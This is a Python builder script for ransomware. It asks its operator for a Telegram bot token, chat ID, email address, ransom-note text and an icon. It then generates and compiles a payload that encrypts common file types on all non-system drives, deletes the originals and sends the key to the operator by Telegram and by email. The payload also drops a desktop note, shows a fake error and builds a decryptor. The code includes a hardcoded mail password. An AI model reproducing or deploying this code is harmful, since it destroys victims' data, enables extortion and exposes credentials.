import smtplib , ssl
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
##### email Modules
import colorama
import sys
import os
import shutil
from Modules.Banner import Banner
import subprocess
import time as t
from colorama.initialise import init
from Modules.IconsDictionary import icons as i
green = colorama.Fore.RED
red = colorama.Fore.BLUE
blue = colorama.Fore.BLUE
black = colorama.Fore.WHITE
bold = '\033[1m'
end = '\033[0m'
numbers1 = [1,2,3,4,5,6]
# color library and
iconDict = i.Icons
colorama.init()

while True :
    try :
        ## showing the Banner ####
        Banner()
        #################################### end ** 
        t.sleep(0.2)
        nameOfFile = input(green+"["+red+"!"+green+"]"+black+" Enter Your File Name : "+red+bold+"").replace(" ","_")
        t.sleep(0.2)
        token = input(end + ""+green+"["+red+"!"+green+"]"+black+" Enter Your Telegram Bot Token : "+red+bold+"").replace(" ","")
        t.sleep(0.2)
        chatId = input(end+""+green+"["+red+"!"+green+"]"+black+" Enter Your Telegram Chat Id : "+red+bold+"").replace(" ","")
        t.sleep(0.2)
        Emaill = input(end+""+green+"["+red+"!"+green+"]"+black+" Enter Your Email : "+red+bold+"").replace(" ","")
        t.sleep(0.2)
        sacrificeTest = input(end+""+green+"["+red+"!"+green+"]"+black+" Enter A Text For sacrifice : "+red+bold+"")
        
        print(end + ""+green+"["+red+"!"+green+"]"+black+"__________Choose Your Icon__________ ")
        for num,name in iconDict.items():
            listOne = name.split("\\")
            t.sleep(0.2)
            print(end+""+green+"["+red+f"{num}"+green+"]"+black+f" {listOne[len(listOne)-1]}")
        t.sleep(0.2)
        print(end+""+green+"["+red+"!"+green+"]"+black+"____________________________________"+end)
    
        iconChoose = input(green+"["+red+"!"+green+"] "+black+"Enter Icon Number Or Icon Path : "+red+bold+"")

        if iconChoose in iconDict.keys():
            iconn = iconDict.get(iconChoose)
        else : 
            pass






        with open(nameOfFile+".py","w") as File :
            File.write('''#### libraries ####
#### libraries ####
import shutil
from subprocess import *
import ctypes
import requests
import subprocess
import time
import socket
from colorama import *
from cryptography.fernet import Fernet
import time
import os 
#### test connection ####
def is_connected():
    REMOTE_SERVER = "www.google.com"
    try:
        host = socket.gethostbyname(REMOTE_SERVER)
        s = socket.create_connection((host, 80))
        return True
    except:
        return False

if is_connected() == True:
    pass
else :
    while True:
        time.sleep(2)
        if is_connected() == True:
            break
        else :
            pass
#### generate key ####
key = Fernet.generate_key()
encriptt = Fernet(key)
keyCode = str(key).replace("b","",1).replace("'","",2)
#######
print (f"This is your key {keyCode}")
#### find drives ### 
Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\\\","").split()
#### remove C Drive from Drives ####
for systemDrive in Drives :
    if systemDrive == "C:":
        Drives.remove(systemDrive)
# Drives = ["E:"]
#### fileFormats ####
fileFormats = ["psd","py","txt","mp3","exe","jpg","pdf"]
######################################################
#################### encrypt files ###################
def Encrypt():
    for Formatt in fileFormats:
        try:
            for drive in Drives:
                with open("log.txt" , "w") as errorlog:
                    cmd = check_output(drive+" && dir /S /B *."+Formatt , shell=True , stderr=errorlog).decode().replace("\\r","").split("\\n")
                    for file in cmd:
                        with open(file,"rb") as readfile:
                            data = readfile.read()
                            encData = encriptt.encrypt(data)
                            newFile = open(file.replace("."+Formatt,"")+".FuckYou"+"_"+Formatt,"wb")
                            newFile.write(encData)
                            readfile.close()
                            newFile.close()
                            os.remove(file)
                            print (f"{file} | Encrypted .")
        except:
            pass
def FakeError():
    try:
        messageBox = ctypes.windll.user32.MessageBoxW
        returnValue = messageBox(0,"This verison of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program","ERROR",0x0 | 0x1)
    except:
        pass


def SendKeyToTelegramBot(token,chatId):
    try:
        text2 = "Your Decrypt Key : "+keyCode+"\\n"
        Url = ("https://api.telegram.org/bot"+token+"/sendmessage?chat_id="+chatId+"&text="+text2)
        Payload = {"UrlBox":Url,"AgentList":"Mozilla Firefox","VersionsList":"HTTP/1.1","MethodList":"Post"}
        Request = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",Payload)
    except:
        pass
def SendKeyToEmail(YourEmail):
    try:
        import smtplib , ssl
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders

        sender = "notreallll00@gmail.com"
        receiver = [YourEmail]
        body_of_email = f"Your Decrypt Key : {keyCode}"
        password = "A3mOyo389#okf"

        msg = MIMEText(body_of_email,"html")
        msg["Subject"] == "File Hunter"
        msg["From"] == sender
        msg["To"] == ','.join(receiver)

        s = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
        s.login(user = sender, password = password)
        s.sendmail(sender,receiver,msg.as_string())
        s.quit
    except:
        pass


def PutTextFile(yourText):
    try:
        desktopPath = os.path.expanduser("~/Desktop")
        with open(desktopPath+"/"+"Hacker_File.txt","w") as HackerFile:
            HackerFile.write(yourText)
    except:
        try:
            desktopPath = os.path.expanduser("~/Desktop")
            with open(desktopPath+"\\\\"+"Hacker_File.txt","w") as HackerFile:
                HackerFile.write(yourText)
        except:
            pass


# change // and after delete this line
def MakeDecryptFile():
    text = """
#### libraries ####
from subprocess import *
from colorama import *
import sys
import pyautogui
from cryptography.fernet import Fernet
import os 
#### generate key ####
key = pyautogui.prompt("Enter The Key" , title="Decrypt Your Files Using Key") # it creat a window amd it write this text top of it (Enter your name)
# key = input("Enter the key : ")
key = bytes(key,"utf-8")
encriptt = Fernet(key)
#######
#### find drives ### 
Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\\\\\\\","").split()
for systemDrive in Drives :
    if systemDrive == "C:":
        Drives.remove(systemDrive)
# Drives = ["E:"]
#### fileFormats ####
fileFormats = ["psd","py","txt","mp3","exe","jpg","pdf"]
######################################################
#################### dicrypt files ###################
def Decrypt():
    for Formatt in fileFormats:
        try:
            for drive in Drives:
                with open("log.txt" , "w") as errorlog:
                    cmd = check_output(drive+" && dir /S /B *.FuckYou_"+Formatt , shell=True , stderr=errorlog)
                    cmd = cmd.decode().replace(f"\\\\r","").split("\\\\n")
                    for file in cmd:
                        with open(file,"rb") as readfile:
                            data = readfile.read()
                            encData = encriptt.decrypt(data)
                            nameOfFile = file.replace(".FuckYou_"+Formatt,"")
                            newFile = open(nameOfFile+"."+Formatt,"wb")
                            newFile.write(encData)
                            readfile.close()
                            newFile.close()
                            os.remove(file)
        except:
            pass
Decrypt()"""
    with open("Decrypt_File_Dont_Delete.py","w") as File:
        File.write(text)
    # time.sleep(9)
    subprocess.check_output("pyinstaller --onefile --noconsole Decrypt_File_Dont_Delete.py",shell=True).decode()
    # time.sleep(9)
    directoryList = os.listdir()
    for ffillee in directoryList:
        if ffillee == "Decrypt_File_Dont_Delete.spec":
            os.remove(ffillee)
        if ffillee == "__pycache__":
            shutil.rmtree(ffillee)
        if ffillee == "build":
            shutil.rmtree(ffillee)
        if "dist" in ffillee:
            os.replace(ffillee , "Decrypt File In This Folder")


if __name__ == "__main__":
    Encrypt()
    SendKeyToTelegramBot("%s","%s")
    SendKeyToEmail("%s")
    PutTextFile("%s")
    FakeError()
    MakeDecryptFile()

''' % (token,chatId,Emaill,sacrificeTest))
        # print(green+"["+red+"+"+green+"]"+black+" File "+red+"-> "+black+f"{nameOfFile}"+red+" <-"+black+" Is Created .")
        #pak shavad agar bad bood
        try:
            with open("PyinstallerLog.txt","w") as file :
                subprocess.check_output(f"pyinstaller --onefile --noconsole {nameOfFile}.py -i {iconn}",shell=True,stderr=file).decode()
            directoryList = os.listdir()
            for ffillee in directoryList:
                if ffillee == f"{nameOfFile}.spec":
                    os.remove(ffillee)
                if ffillee == "__pycache__":
                    shutil.rmtree(ffillee)
                if ffillee == "build":
                    shutil.rmtree(ffillee)
                if ffillee == "dist":
                    os.replace(ffillee , "Your File Is Here")
                    nn = 1
                else :
                    nn = 0
                if nn == 1:
                    shutil.move(f"{nameOfFile}.py","Your File Is Here")
                    print(green+"["+red+"+"+green+"]"+black+" Python And Exe File "+red+"-> "+black+f"{nameOfFile}"+red+" <-"+black+" Is Created ")
            try:
                os.remove("PyinstallerLog.txt")
            except:
                pass
        except:
            ##
            directoryList = os.listdir()
            for ffillee in directoryList:
                if ffillee == f"{nameOfFile}.spec":
                    os.remove(ffillee)
                if ffillee == "__pycache__":
                    shutil.rmtree(ffillee)
                if ffillee == "build":
                    shutil.rmtree(ffillee)
                if ffillee == "dist":
                    shutil.rmtree(ffillee)
                try:
                    os.remove("PyinstallerLog.txt")
                except:
                    pass
                ##
            #os.mkdir("Your File Is Here")
            #shutil.move(f"{nameOfFile}.py","FileHunter")
            print(green+"["+red+"+"+green+"]"+black+" Python File "+red+"-> "+black+f"{nameOfFile}"+red+" <-"+black+" Is Created .")
        #pak shavad
    except :
        print(end+""+green+"\n["+red+"-"+green+"]"+black+" Somthing Went Wrong .")
        sys.exit()
    sys.exit()